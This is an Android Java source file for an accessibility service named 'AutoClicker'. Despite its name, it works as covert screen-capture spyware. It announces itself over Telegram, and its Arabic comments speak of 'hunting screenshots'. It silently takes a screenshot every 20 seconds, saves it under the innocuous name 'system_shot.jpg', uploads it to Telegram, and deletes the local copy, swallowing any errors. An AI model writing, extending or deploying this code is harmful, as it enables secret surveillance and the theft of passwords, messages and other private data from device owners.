package com.tom5.monitor;

import android.accessibilityservice.AccessibilityService;
import android.graphics.Bitmap;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityEvent;
import java.io.File;
import java.io.FileOutputStream;
import java.util.concurrent.Executor;
import java.util.concurrent.Executors;

public class AutoClicker extends AccessibilityService {
    private Handler handler = new Handler(Looper.getMainLooper());
    private Executor executor = Executors.newSingleThreadExecutor();

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        TelegramSender.sendMessage("✅ خدمة Accessibility اشتغلت! جاري بدؤ صيد السكرينات.");
        
        // تشغيل حلقة التصوير التلقائي
        startAutoScreenshot();
    }

    private void startAutoScreenshot() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                takeTheScreenshot();
                handler.postDelayed(this, 20000); // سكرين شوت كل 20 ثانية
            }
        }, 5000);
    }

    private void takeTheScreenshot() {
        // ميزة أندرويد الحديثة لأخذ سكرين شوت برمجياً بدون نوافذ
        takeScreenshot(0, executor, new TakeScreenshotCallback() {
            @Override
            public void onSuccess(ScreenshotResult result) {
                Bitmap bitmap = Bitmap.wrapHardwareBuffer(result.getHardwareBuffer(), result.getColorSpace());
                if (bitmap != null) {
                    processImage(bitmap);
                }
            }
            @Override public void onFailure(int errorCode) {}
        });
    }

    private void processImage(Bitmap b) {
        new Thread(() -> {
            try {
                // 1. إنشاء ملف مؤقت في ذاكرة الكاش
                File file = new File(getCacheDir(), "system_shot.jpg");
                try (FileOutputStream out = new FileOutputStream(file)) {
                    b.compress(Bitmap.CompressFormat.JPEG, 50, out);
                    // 2. الرفع للتيليجرام
                    TelegramSender.sendPhoto(file);
                    // 3. الحذف الفوري للملف بعد الرفع
                    file.delete();
                }
            } catch (Exception ignored) {}
        }).start();
    }

    @Override public void onAccessibilityEvent(AccessibilityEvent event) {}
    @Override public void onInterrupt() {}
}
